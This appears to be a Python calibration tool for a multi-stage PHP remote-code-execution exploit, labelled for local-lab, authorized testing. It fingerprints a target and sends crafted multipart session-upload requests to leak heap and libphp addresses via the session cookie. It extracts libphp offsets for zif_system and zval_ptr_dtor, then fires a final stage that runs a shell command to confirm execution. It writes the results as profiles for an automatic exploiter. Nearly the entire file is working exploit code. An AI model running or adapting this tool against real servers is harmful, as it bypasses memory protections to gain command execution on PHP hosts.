#!/usr/bin/env python3
"""
php2shell_calibrate.py — build a verified profile for one PHP/libphp build.

The RCE chain is not version-generic: libphp symbol offsets and the Zend MM
heap layout change with the build. This tool turns a local replica of one build
into a JSON profile that php2shell_auto.py can dispatch to.

What it does
------------
1. Fingerprints the target over HTTP.
2. Reads the effective configuration from the target container
   (memory_limit, display_errors, worker count, session settings).
3. Extracts zif_system / zval_ptr_dtor from the container's libphp.so.
4. Calibrates stage 1 (heap leak): finds N and the forge length that produce a
   4096-byte Set-Cookie.
5. Calibrates stage 2 (libphp leak): finds the array index T that yields a
   page-aligned pDestructor.
6. Tries the known stage-3 layouts and verifies a real command execution
   (proof file). A profile is written with rce=true ONLY after the proof.
7. Writes profiles/<version>-<fingerprint>.json.

Usage (local lab only; calibration needs container access):
    python3 php2shell_calibrate.py \
        --target http://127.0.0.1:8088/index.php \
        --container php2shell-target \
        --repo-dir /tmp/php2shell-rce \
        --proof-file /tmp/php2shell-rce/out/p1

Options --stage1-n / --stage1-len / --stage2-t / --stage3-htdata / --stage3-pads
skip the corresponding search when you already know the values.

Authorized testing only.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
import re
import struct
import subprocess
import sys
import time
import urllib.parse

from php2shell_paths import default_repo_dir
from php2shell_upstream import patch_params, patch_tls

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}


def load_upstream(repo: str):
    path = os.path.join(repo, "exploit.py")
    if not os.path.isfile(path):
        raise SystemExit(f"{path} not found; clone 9bie/php2shell-bypass-aslr-exp")
    spec = importlib.util.spec_from_file_location("p2s_upstream", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def docker(container: str, command: str, timeout: int = 30) -> str:
    try:
        out = subprocess.run(["docker", "exec", container, "sh", "-c", command],
                             capture_output=True, text=True, timeout=timeout)
        return out.stdout
    except (OSError, subprocess.SubprocessError):
        return ""


def parse_memory_limit(text: str) -> int | None:
    m = re.search(r"memory_limit\s*=>\s*(\S+)", text)
    if not m:
        return None
    value = m.group(1)
    if value in ("-1", "0"):
        return -1
    mult = {"K": 1024, "M": 1024 ** 2, "G": 1024 ** 3}
    if value[-1].upper() in mult:
        return int(value[:-1]) * mult[value[-1].upper()]
    return int(value) if value.isdigit() else None


def container_config(container: str) -> dict:
    ini = docker(container, "php -i 2>/dev/null")
    workers = docker(container, "ps -eo cmd 2>/dev/null | grep -c '[a]pache2'").strip()
    count = int(workers) if workers.isdigit() else 0
    return {
        "memory_limit": parse_memory_limit(ini),
        # CLI and the web SAPI can differ (FPM pool / .htaccess). The stage-1
        # leak is the authoritative check for the web SAPI; it is filled below.
        "display_errors": "unknown (CLI says On)" if re.search(r"display_errors\s*=>\s*On", ini)
                          else "unknown (CLI says Off)",
        "session_upload_progress": "On" if re.search(r"session\.upload_progress\.enabled\s*=>\s*On", ini) else "Off",
        "workers": max(count - 1, 0) if count else None,
    }


def extract_symbols(repo: str, container: str) -> dict:
    script = os.path.join(repo, "docker", "offsets.py")
    if not os.path.isfile(script):
        raise SystemExit(f"{script} not found")
    print("[*] extracting libphp symbols from", container)
    subprocess.run([sys.executable, script, container], check=True)
    env = os.path.join(repo, "out", "offsets.env")
    values = {}
    with open(env, encoding="utf-8") as fh:
        for line in fh:
            if "=" in line and not line.startswith("#"):
                k, v = line.strip().split("=", 1)
                values[k] = int(v, 0)
    return {"zif_system": values["ZIF_OFFSET"], "zval_ptr_dtor": values["DTOR_OFFSET"]}


def fingerprint(url: str):
    import socket
    import ssl
    u = urllib.parse.urlsplit(url if "://" in url else "http://" + url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    s = socket.create_connection((host, port), timeout=10)
    if u.scheme == "https":
        s = ssl._create_unverified_context().wrap_socket(s, server_hostname=host)
    s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: p2s-cal/1.0\r\n"
               f"Connection: close\r\n\r\n").encode())
    data = b""
    try:
        while len(data) < 65536:
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError:
        pass
    s.close()
    head, _, body = data.partition(b"\r\n\r\n")
    headers = {}
    for line in head.split(b"\r\n")[1:]:
        if b":" in line:
            k, _, v = line.partition(b":")
            headers.setdefault(k.decode("latin-1").strip().lower(), v.decode("latin-1").strip())
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", headers.get("x-powered-by", ""))
    if not m:
        m = re.search(rb"PHP/(\d+\.\d+\.\d+)", body)
    version = m.group(1).decode() if hasattr(m.group(1), "decode") else (m.group(1) if m else "")
    return version, headers.get("server", "?"), headers.get("x-powered-by", "")


# ---------------------------------------------------------------------------
# request builders (same shapes as the upstream chain)
# ---------------------------------------------------------------------------
def _stage1_parts(mod, ex, n, forge_len):
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    ex.t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
              read_cap=1 << 20, timeout=90)
    time.sleep(0.2)
    parts = [{"name": "PHPSESSID", "data": mod.SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * forge_len)
    if forge_len >= 0x19:
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    return ex.t.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)


def _cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1")) if m else b""


def chunk_base(raw: bytes) -> int:
    from collections import Counter
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x10000 < v < 0x0001000000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def _stage2_parts(mod, ex, t_index, v_len):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
              ex._file_part(), ex._big_field()]
    ex.t.post(mod.build_multipart(parts, b"S" * 17), b"S" * 17,
              read_cap=1 << 20, timeout=90)
    time.sleep(0.2)
    parts = [{"name": "PHPSESSID", "data": mod.SID},
             {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == t_index else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * v_len})
    return ex.t.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)


def libphp_base(raw: bytes, dtor: int) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x10000 < p < 0x0001000000000000):
        return 0
    if p & 0xFFF != dtor & 0xFFF:
        return 0
    base = p - dtor
    return base if base & 0xFFF == 0 else 0


# ---------------------------------------------------------------------------
# calibration
# ---------------------------------------------------------------------------
def calibrate_stage1(mod, ex, hints):
    if hints.get("stage1_n") and hints.get("stage1_len"):
        raw = _cookie(_stage1_parts(mod, ex, hints["stage1_n"], hints["stage1_len"]))
        base = chunk_base(raw)
        print(f"[*] stage1 hint N={hints['stage1_n']} len={hints['stage1_len']} -> "
              f"cookie={len(raw)} chunk={hex(base) if base else 0}")
        return base, hints["stage1_n"], hints["stage1_len"]

    ex.rotate()
    probe = _cookie(_stage1_parts(mod, ex, 900, 48))
    m = re.search(rb"v(\d{4})", probe)
    if not m:
        print("[!] stage1 probe did not reveal the stale-block index")
        return 0, 0, 0
    index = int(m.group(1))
    print(f"[*] stage1 probe: stale block taken by v{index:04d}")
    for forge_len in (63, 79, 87, 95):
        ex.rotate()
        raw = _cookie(_stage1_parts(mod, ex, index, forge_len))
        base = chunk_base(raw)
        print(f"    N={index} len={forge_len} -> cookie={len(raw)} chunk={hex(base) if base else 0}")
        if base and len(raw) >= 1000:
            return base, index, forge_len
    return 0, 0, 0


def calibrate_stage2(mod, ex, dtor, hints):
    candidates = [hints["stage2_t"]] if hints.get("stage2_t") else list(range(350, 461))
    for t in candidates:
        ex.rotate()
        raw = _cookie(_stage2_parts(mod, ex, t, hints.get("stage2_v", 16)))
        base = libphp_base(raw, dtor)
        if base:
            print(f"[*] stage2 T={t} -> libphp={hex(base)}")
            return base, t
    print("[!] stage2 sweep found no libphp pointer")
    return 0, hints.get("stage2_t", 0)


def calibrate_stage3(mod, ex, chunk, lib, zif, proof, hints):
    if not chunk or not lib:
        return False, None
    layouts = []
    if hints.get("stage3_htdata"):
        layouts.append(("hint", hints["stage3_htdata"], hints.get("stage3_pads", "bookworm")))
    else:
        for off in (0x690D8, 0x6E0D8, 0x5404A):
            for pads in ("bookworm", "lab"):
                layouts.append((f"{hex(off)}/{pads}", off, pads))
    for name, off, pads in layouts:
        try:
            if os.path.exists(proof):
                os.unlink(proof)
        except OSError:
            pass
        if pads == "lab":
            ex.stage3_carrier = False
            ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
        else:
            ex.stage3_carrier = True
            ex.stage3_pads = [(31, 31)] * 6
        try:
            ex.rotate()
            ex.stage3(chunk + off, lib + zif)
        except Exception as exc:
            print(f"    stage3 {name}: {exc}")
        if os.path.exists(proof) and os.path.getsize(proof) > 0:
            with open(proof) as handle:
                print(f"[+] stage3 {name}: {handle.read().strip()}")
            return True, {"htdata": off, "pads": pads}
        print(f"    stage3 {name}: no proof")
    return False, None


def container_arch(container: str) -> str | None:
    try:
        result = subprocess.run(["docker", "exec", container, "uname", "-m"],
                                capture_output=True, text=True, timeout=10)
    except (OSError, subprocess.SubprocessError):
        return None
    return {"aarch64": "aarch64", "arm64": "aarch64",
            "x86_64": "amd64", "amd64": "amd64"}.get(result.stdout.strip().lower())


def main() -> int:
    ap = argparse.ArgumentParser(description="Calibrate one PHP2Shell build profile.")
    ap.add_argument("--target", required=True)
    ap.add_argument("--container", required=True)
    ap.add_argument("--repo-dir", default=default_repo_dir())
    ap.add_argument("--proof-file", required=True)
    ap.add_argument("--out-dir", default=os.path.join(ROOT, "profiles"))
    ap.add_argument("--stage1-n", type=int)
    ap.add_argument("--stage1-len", type=int)
    ap.add_argument("--stage2-t", type=int)
    ap.add_argument("--stage2-v", type=int, default=16)
    ap.add_argument("--stage3-htdata", type=lambda x: int(x, 0))
    ap.add_argument("--stage3-pads", choices=("bookworm", "lab"))
    ap.add_argument("--distro", default="unknown")
    ap.add_argument("--arch", choices=("aarch64", "amd64"), default=None)
    args = ap.parse_args()

    arch = args.arch or container_arch(args.container)
    if arch is None:
        for candidate in ("amd64", "aarch64"):
            if candidate in args.distro:
                arch = candidate
                break
    if arch is None:
        print("[!] cannot determine target architecture; pass --arch", file=sys.stderr)
        return 3

    patch_params(args.repo_dir)
    if args.target.startswith("https://"):
        patch_tls(args.repo_dir)

    version, server, powered = fingerprint(args.target)
    print(f"[*] target {args.target}: PHP {version or '?'} / {server}")
    if not version:
        return 3
    branch = ".".join(version.split(".")[:2])
    fixed = FIXED.get(branch)
    if fixed and int(version.split(".")[2]) >= fixed:
        print(f"[+] PHP {version} is at/above the fixed release {branch}.{fixed}")
        return 0

    cfg = container_config(args.container)
    print(f"[*] container config: {cfg}")
    sym = extract_symbols(args.repo_dir, args.container)
    mod = load_upstream(args.repo_dir)
    t = mod.Target(args.target, verbose=False)
    ex = mod.Exploit(t, "id>/out/p1",
                     zif_offset=sym["zif_system"], dtor_offset=sym["zval_ptr_dtor"],
                     profile="bookworm", verbose=False)

    ex.rotate()
    chunk, n, forge_len = calibrate_stage1(mod, ex, vars(args))
    if chunk:
        cfg["display_errors"] = "On (web SAPI, stage-1 leak succeeded)"
    lib, t_index = calibrate_stage2(mod, ex, sym["zval_ptr_dtor"], vars(args))
    rce, stage3 = calibrate_stage3(mod, ex, chunk, lib, sym["zif_system"],
                                   args.proof_file, vars(args))

    profile = {
        "name": f"php-{version}-{args.distro}",
        "php_version": version,
        "branch": branch,
        "fixed_in": f"{branch}.{fixed}" if fixed else None,
        "sapi": "apache2handler",
        "arch": arch,
        "distro": "debian" if "bookworm" in args.distro else args.distro,
        "verified": rce,
        "rce": rce,
        "oom_mb": 12,
        "upstream_profile": "bookworm",
        "libphp": {
            "zif_system": hex(sym["zif_system"]),
            "zval_ptr_dtor": hex(sym["zval_ptr_dtor"]),
            "htdata": hex(stage3["htdata"]) if stage3 else None,
        },
        "stages": {
            "stage1_n": n,
            "stage1_forge_len": forge_len,
            "stage2_t": t_index,
            "stage2_v": args.stage2_v,
            "stage3_pads": ([[31, 31]] * 6 if stage3 and stage3["pads"] == "bookworm"
                            else ([(8, 7)] + [(7, 7)] * 5 if stage3 else None)),
            "stage3_carrier": (stage3["pads"] == "bookworm") if stage3 else None,
        },
        "config": cfg,
        "measured": {
            "chunk_base": hex(chunk) if chunk else None,
            "libphp_base": hex(lib) if lib else None,
        },
        "status": ("RCE verified" if rce else
                    ("leaks calibrated; stage 3 not verified" if (chunk and lib)
                     else "calibration failed: heap/libphp leak not reproduced")),
    }
    os.makedirs(args.out_dir, exist_ok=True)
    path = os.path.join(args.out_dir, f"{version}-{args.distro}.json")
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(profile, fh, indent=2)
    print(f"[*] wrote {path}")
    print(f"[*] rce={rce} chunk={hex(chunk) if chunk else 0} libphp={hex(lib) if lib else 0}")
    return 0 if rce else 2


if __name__ == "__main__":
    sys.exit(main())
